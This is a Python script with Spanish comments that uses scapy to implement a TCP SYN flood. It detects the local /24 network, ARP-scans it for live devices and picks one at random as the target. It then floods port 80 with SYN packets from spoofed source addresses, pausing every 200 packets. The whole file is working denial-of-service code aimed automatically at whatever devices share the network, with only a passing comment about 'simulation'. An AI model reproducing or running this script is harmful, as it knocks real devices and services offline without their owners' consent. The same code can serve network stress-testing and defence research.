import time
import random
import socket
import struct
import ipaddress
from scapy.all import IP, TCP, send, ARP, Ether, srp

running = False  # Variable global de control para detener el ataque

def getLocalNetwork():
    """Obtiene automáticamente la red local en formato CIDR (ej: '192.168.1.0/24')"""
    try:
        # Obtener la IP local de la máquina
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        # Obtener la máscara de red asociada a esa IP
        network_mask = socket.inet_ntoa(struct.pack('!I', (1 << 32) - (1 << (32 - 24))))

        # Obtener la red completa en formato CIDR
        network = ipaddress.IPv4Network(f"{local_ip}/{network_mask}", strict=False)
        
        return str(network)
    except Exception as e:
        raise Exception(f"No se pudo detectar la red local automáticamente: {e}")

def attack():
    """Detecta dispositivos en la red local y lanza un ataque TCP SYN Flooding automáticamente"""
    global running
    print(f"Cargado TCP SYN Flooding")

    try:
        # Detectar la red local automáticamente
        network = getLocalNetwork()
        print(f"Red detectada automáticamente: {network}")

        # Escanear la red para detectar dispositivos activos
        print("Escaneando dispositivos en la red local...")
        
        arp_request = ARP(pdst=network)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

        devices = [received.psrc for _, received in answered_list]
        
        if not devices:
            raise Exception("No se detectaron dispositivos activos en la red.")

        print(f"Dispositivos detectados: {devices}")
        
        # Seleccionar un dispositivo aleatoriamente
        target_ip = random.choice(devices)
        target_port = 80  # Puerto común para simulación HTTP
        iface = "en0"  # Cambia esto según tu interfaz de red (ej: "eth0", "wlan0")

        print(f"Dispositivo seleccionado automáticamente para atacar: {target_ip}")

        while True:
            # Inicia el ataque
            packet_count = 0

            while running:
                # Generar IPs y puertos de origen aleatorios
                src_ip = f"10.0.0.{random.randint(1, 254)}"
                src_port = random.randint(1024, 65535)

                # Crear paquete TCP con flag SYN activada
                ip_packet = IP(src=src_ip, dst=target_ip)
                tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")
                packet = ip_packet / tcp_packet

                # Enviar el paquete
                send(packet, iface=iface, verbose=False)
                print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
                packet_count += 1

                if packet_count % 200 == 0:
                    print(f"Pausa de 20 segundos... Última IP atacada: {target_ip}")
                    time.sleep(20)
                    print("Iniciando otra iteración de TCP SYN Flooding")
                    
                time.sleep(0.1)
            time.sleep(1)
        
    except Exception as e:
        print(f"Error: {e}")
